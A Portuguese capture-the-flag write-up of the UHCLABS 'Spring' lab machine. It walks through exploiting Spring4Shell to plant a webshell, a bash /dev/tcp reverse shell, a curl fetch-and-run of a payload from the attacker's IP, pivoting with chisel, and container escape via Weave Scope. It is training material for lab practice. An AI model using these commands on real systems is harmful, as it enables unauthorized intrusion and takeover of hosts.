---
title: Writeup Spring -UHCLABS
author: José Inácio
date: 2022-07-21
categories: [Writeup, UHCLABS]
tags: [Writeup, UHCLABS, CTF]
pin: true
---


Inicialmente foi realizada uma varredura de portas para o IP, em busca de serviços com versões expostas e que contenham vulnerabilidades publicas.

![Desktop View](/img/writeup/uhclabs/Spring/nmap.png){: width="700" height="202" .w-75 .normal}

Vendo as portas 80,8080 abertas, e foi realizado o acesso a ambas, e possível ver um site para porta 80, e uma mensagem de erro 404 na porta 8080

![Desktop View](/img/writeup/uhclabs/Spring/errorSpringboot.png){: width="700" height="202" .w-75 .normal}

O erro nos indica se tratar de um Spring boot, então buscamos realizar uma forca bruta de arquivos e diretórios neste host, foi possível identificar o arquivo teste que retorna um hello word ao ser acessado.

![Desktop View](/img/writeup/uhclabs/Spring/feroxbuster.png){: width="700" height="202" .w-75 .normal}

![Desktop View](/img/writeup/uhclabs/Spring/helloword.png){: width="700" height="202" .w-75 .normal}

Buscamos então por vulnerabilidade e foi possível encontrar o exploit publico de CVE 2022–22965 (Spring4Shell, SpringShell) que é uma vulnerabilidade no Spring Framework usa uma funcionalidade de vinculação de dados para vincular dados armazenados em uma solicitação HTTP a determinados aplicativos por um aplicativo.

O bug existe no método getCachedIntrospectionResults, que pode ser usado para obter não autorizados a tais objetos passando seus nomes de classe por meio de uma solicitação HTTP. Ele cria os riscos de vazamento de dados e execução remota de código de classes de objetos especiais são usados.

Para mais informações acesse o link abaixo:
<https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/>

Sabendo do que se trata podemos utilizar o exploit abaixo, que basicamente irá fazer um upload de uma webshell:
<https://github.com/lunasec-io/Spring4Shell-POC>

Executamos o exploit:

![Desktop View](/img/writeup/uhclabs/Spring/exploit.png){: width="700" height="202" .w-75 .normal}


Após ele ter feito o upload da webshell, podemos executar comandos remotamente no servidor

![Desktop View](/img/writeup/uhclabs/Spring/webshell.png){: width="700" height="202" .w-75 .normal}

Tentamos então “trigar” uma “reverse-shell”, criei um arquivo com o código

```bash   

    #!/bin/bash

    /bin/bash -c ‘sh -i >& /dev/tcp/ip-vpn/443 0>&1’
```

Deixei minha maquina executando na porta 443 com o ncat

```bash   
    nc -nvlp 443
```

Abri uma porta 80 com o SimpleHTTPServer do python

```bash   
    python2.7 -m SimpleHTTPServer 80
```
Utilizei o curl para fazer uma requisição para o nosso IP da vpn pegando a nossa payload e executando

```bash   
    curl http://ip-vpn/shell.sh -o /shell.sh

    sh /shell.sh
```

Recebemos a shell

![Desktop View](/img/writeup/uhclabs/Spring/shell.png){: width="700" height="202" .w-75 .normal}

Irei mudar de shell simples para um interativo

```bash   
    python3 -c “import pty;pty.spawn(‘/bin/bash’)”
    Ctrl+Z
    Write-Up — Spring8stty raw -echo;fg
    Enter
    export TERM=xterm

```

![Desktop View](/img/writeup/uhclabs/Spring/shellInterativo.png){: width="700" height="202" .w-75 .normal}


Depois foi só pesquisar a primeira flag(não vou evidenciar aqui, por basta somente procurar no host)

Para escalar lateralmente fizemos uma busca no host e foi possível identificar o IP do host 172.17.0.3

![Desktop View](/img/writeup/uhclabs/Spring/host.png){: width="700" height="202" .w-75 .normal}

Como o servidor não tem o nmap, podemos baixar um nmap estático e em seguida enviaremos para o servidor.

<https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap>

![Desktop View](/img/writeup/uhclabs/Spring/curl.png){: width="700" height="202" .w-75 .normal}


Fizemos um namp na rede para buscar IP ativos, encontramos dois, vamos focar no 172.17.0.2

![Desktop View](/img/writeup/uhclabs/Spring/nmap-internal.png){: width="700" height="202" .w-75 .normal}


Realizamos um varredura nesse host e identificamos a porta 4040 aberta

![Desktop View](/img/writeup/uhclabs/Spring/nmap-internal-2.png){: width="700" height="202" .w-75 .normal}

fazendo uma requisição a esta porta podemos notar que se trata de uma aplicação web → Weave Scope, é uma ferramenta de visualização e monitoramento para Docker e Kubernetes Por padrão o Weave scope precisa subir em um docker privilegiado, sabendo disso podemos montar o disco do sistema principal dentro do docker do Weave scope.

![Desktop View](/img/writeup/uhclabs/Spring/requsicao.png){: width="700" height="202" .w-75 .normal}

Para realizar o pivoting vamos usar a ferramenta chisel

<https://github.com/jpillora/chisel>

No servidor iremos abrir uma porta 9000 e no cliente apontaremos a conexão do host 172.17.0.2 para essa porta, assim conseguimos acessa localmente.

![Desktop View](/img/writeup/uhclabs/Spring/openport.png){: width="700" height="202" .w-75 .normal}

![Desktop View](/img/writeup/uhclabs/Spring/port4040.png){: width="700" height="202" .w-75 .normal}

Podemos ver o terminal do Weave Scope, e com isso listar as partições.

![Desktop View](/img/writeup/uhclabs/Spring/terminalWeaveScope.png){: width="700" height="202" .w-75 .normal}


Agora podemos montar a partição na pasta mnt e ter acesso a flag

![Desktop View](/img/writeup/uhclabs/Spring/root.png){: width="700" height="202" .w-75 .normal}

obs: os ips podem estar diferente em prints pois houve a necessidade de restart do host